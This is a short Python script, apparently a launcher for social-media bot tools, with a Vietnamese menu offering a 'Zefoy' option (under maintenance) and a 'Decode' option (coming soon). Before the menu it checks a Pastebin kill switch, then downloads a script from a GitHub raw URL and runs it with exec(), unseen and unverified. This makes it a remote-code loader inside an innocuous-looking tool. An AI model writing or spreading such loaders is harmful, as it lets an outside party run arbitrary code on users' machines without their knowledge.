import requests,json, inquirer 

__check__ = requests.get('https://pastebin.com/raw/ji4T6sYx').text
if "on" in __check__:
  input("Sever Online\nPress Enter to continue...")
else:
  exit("Sever Offline")

exec(requests.get('https://raw.githubusercontent.com/kouseikzt/kzt1/main/shorterlink.py').text)
  
questions = [
		inquirer.List('type',
					  message="Chọn Tool",
					  choices=['Zefoy(Bảo Trì)', 'Decode Berser(comming soon)'],
					  ),
	]
answers = inquirer.prompt(questions)
if answers['type'] == 'Zefoy(Bảo Trì)':
  print("Bảo trì!")
if answers['type'] == 'Decode Berser(comming soon)':
  print("Comming soon!")
